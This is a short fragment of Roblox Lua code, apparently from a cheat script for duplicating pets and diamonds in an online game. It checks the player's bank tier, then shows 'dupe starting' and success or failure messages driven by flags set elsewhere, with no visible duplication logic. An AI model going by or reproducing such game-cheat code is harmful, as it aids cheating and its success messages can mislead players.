if unverifedbank == true and givewarning == true or getbanktierfortier1.Text == "Tier 1 Bank" and givewarning == true or game.Players.LocalPlayer.PlayerGui.Bank.Frame.Side.Holder:FindFirstChild("_BuyBankButton") and giveawrningforbuybank == true then
	lib.Message.New("Dupe Failed because you dont have a tier 2 or upper tier bank!");
	return;
end

--CHECK IF UNVERIFED BANK--

--MAIN--

if dupesuccsesd == true then
    lib.Message.New("Pets Dupe Starting");
    wait(0.2)
    lib.Message.New("Pets Dupe Succses!")
end

if dupesuccsesd2 == true then
    lib.Message.New("Diamonds Dupe Starting");
    wait(0.2)
    lib.Message.New("Diamonds Dupe Succses!")
end

if dupesuccsesd == false then
    lib.Message.New("Pets Dupe Starting");
    wait(0.2)
    lib.Message.New("Pets Dupe Failure Please Try Again!")
end

if dupesuccsesd2 == false then
    lib.Message.New("Diamonds Dupe Starting");
    wait(0.2)
    lib.Message.New("Diamonds Dupe Failure Please Try Again!")
end

--MAIN--